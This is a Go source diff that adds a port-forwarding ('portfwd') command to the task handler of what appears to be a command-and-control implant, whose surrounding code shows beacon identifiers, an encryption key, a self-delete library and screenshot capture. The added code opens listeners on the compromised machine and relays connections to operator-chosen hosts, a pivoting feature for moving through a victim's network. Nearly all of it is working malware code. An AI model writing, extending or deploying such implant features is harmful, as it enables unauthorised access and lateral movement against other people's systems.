@@ -7,6 +7,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"image/png"
+	"io"
+	"net"
 	"net/http"
 	"os"
 	"path"
@@ -18,6 +20,9 @@ import (
 	selfdelete "github.com/secur30nly/go-self-delete"
 	"github.com/vova616/screenshot"
 )
+
+var PortFwdMap = make(map[int]string)
+var PortFwdListenerMap = make(map[int]net.Listener)
 
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
@@ -106,6 +111,54 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "cd":
 			os.Chdir(taskData)
 			data = fmt.Sprintf("changed directory to %s", taskData)
+		case "portfwd":
+			if strings.HasPrefix(taskData, "add") {
+				taskDataSplit := strings.Split(taskData, " / ")
+				lport := taskDataSplit[1]
+				rport := taskDataSplit[2]
+				rhost := taskDataSplit[3]
+
+				forwardingRuleString := fmt.Sprintf("0.0.0.0:%s -> %s:%s", lport, rhost, rport)
+
+				PortFwdMap[len(PortFwdMap)] = forwardingRuleString
+
+				// start forwarder
+				forwarder, err := net.Listen("tcp", fmt.Sprintf(":%s", lport))
+				if err != nil {
+					data = err.Error()
+					break
+				}
+
+				// listen for connections
+				go func(s net.Listener, rhost string, rport string) {
+					for {
+						client, _ := s.Accept()
+						go handleForward(client, rhost, rport)
+					}
+				}(forwarder, rhost, rport)
+
+				PortFwdListenerMap[len(PortFwdListenerMap)] = forwarder
+			} else if strings.HasPrefix(taskData, "del") {
+				taskDataSplit := strings.Split(taskData, " / ")
+				id := taskDataSplit[1]
+				intId, err := strconv.Atoi(id)
+				if err != nil {
+					data = err.Error()
+					break
+				}
+
+				PortFwdListenerMap[intId].Close()
+				PortFwdMap[intId] = PortFwdMap[intId] + " (killed)"
+			} else if strings.HasPrefix(taskData, "list") {
+				for key, value := range PortFwdMap {
+					data += fmt.Sprintf("[%d] %s\n", key, value)
+				}
+			} else if strings.HasPrefix(taskData, "clear") {
+				for key, value := range PortFwdListenerMap {
+					value.Close()
+					PortFwdMap[key] = PortFwdMap[key] + " (killed)"
+				}
+			}
 		default:
 			data = "command not supported"
 		}
@@ -139,4 +192,18 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			os.Exit(2)
 		}
 	}
+}
+
+func handleForward(conn net.Conn, rhost string, rport string) {
+	remoteAdr := rhost + ":" + rport
+	remote, _ := net.Dial("tcp", remoteAdr)
+
+	go forward(conn, remote)
+	go forward(remote, conn)
+}
+
+func forward(src, dest net.Conn) {
+	defer src.Close()
+	defer dest.Close()
+	io.Copy(src, dest)
 }
